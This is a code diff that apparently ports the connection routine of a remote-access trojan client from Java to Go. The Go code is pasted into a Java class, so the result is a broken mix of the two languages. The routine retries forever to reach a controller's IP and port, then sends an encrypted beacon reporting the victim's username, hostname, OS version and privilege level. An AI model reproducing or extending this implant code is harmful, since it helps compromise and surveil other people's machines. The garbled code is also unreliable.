@@ -35,61 +35,50 @@ class MainForm {
         connectionThread.start();
     }
 
-    private void connect() {
-        System.out.println("Starting connect method...");
-        while (true) {
-            try {
-                System.out.println("Connect: Attempting connection...");
-                if (client == null || client.isClosed()) {
-                    if (delay > 0) {
-                        System.out.println("Connect: Delaying for " + delay + " milliseconds...");
-                        TimeUnit.MILLISECONDS.sleep(delay);
-                    }
+	func (mf *MainForm) connect() {
+		fmt.Println("Starting connect method...")
+		for {
+			fmt.Println("Connect: Attempting connection...")
+			if mf.client == nil || mf.client.RemoteAddr() == nil {
+				if mf.delay > 0 {
+					fmt.Println("Connect: Delaying for", mf.delay, "milliseconds...")
+					time.Sleep(mf.delay)
+				}
 
-                    client = new Socket(clientIP, clientPort);
-                    outputStream = client.getOutputStream();
-                    inputStream = client.getInputStream();
+				conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", mf.clientIP, mf.clientPort))
+				if err != nil {
+					fmt.Println("Exception in Connect:", err.Error())
+					time.Sleep(4 * time.Second) // Retry after delay
+					continue
+				}
 
-                    System.out.println("Connect: Successfully connected to " + clientIP + ":" + clientPort);
+				mf.client = conn
+				mf.outputStream = mf.client
+				mf.inputStream = mf.client
 
-                    String newConnectionMessage = String.format("NewConnection|Java|%s|%s|%s|%s|%s",
-                            System.getProperty("user.name"),
-                            InetAddress.getLocalHost().getHostName(),
-                            System.getProperty("os.name"),
-                            System.getProperty("os.version"),
-                            getPrivileges());
+				fmt.Println("Connect: Successfully connected to", mf.clientIP, ":", mf.clientPort)
 
-                    System.out.println("Connect: newConnectionMessage: " + newConnectionMessage);
+				newConnectionMessage := fmt.Sprintf("NewConnection|Go|%s|%s|%s|%s|%s",
+					os.Getenv("USER"),
+					getHostname(),
+					getOS(),
+					getOSVersion(),
+					mf.getPrivileges())
 
-                    String encryptedMessage = AESEncrypt(newConnectionMessage, encryptionKey);
-                    System.out.println("Connect: Encrypted message: " + encryptedMessage);
+				fmt.Println("Connect: newConnectionMessage:", newConnectionMessage)
 
-                    send(encryptedMessage);
-                    System.out.println("Connect: Message sent");
+				encryptedMessage, _ := AESEncrypt(newConnectionMessage, mf.encryptionKey)
+				fmt.Println("Connect: Encrypted message:", encryptedMessage)
 
-                    new Thread(this::read).start();
-                    break; // Exit loop on successful connection
-                }
-            } catch (Exception ex) {
-                if (client != null) {
-                    try {
-                        client.close();
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                    client = null;
-                }
+				mf.send(encryptedMessage)
+				fmt.Println("Connect: Message sent")
 
-                System.out.println("Exception in Connect: " + ex.getMessage());
-                ex.printStackTrace();
-                try {
-                    TimeUnit.SECONDS.sleep(4); // Retry after delay
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
-    }
+				go mf.read() // Start a new goroutine to handle reading from the socket
+				break        // Exit loop on successful connection
+			}
+		}
+	}
+
 
     private void read() {
         System.out.println("Starting read method...");
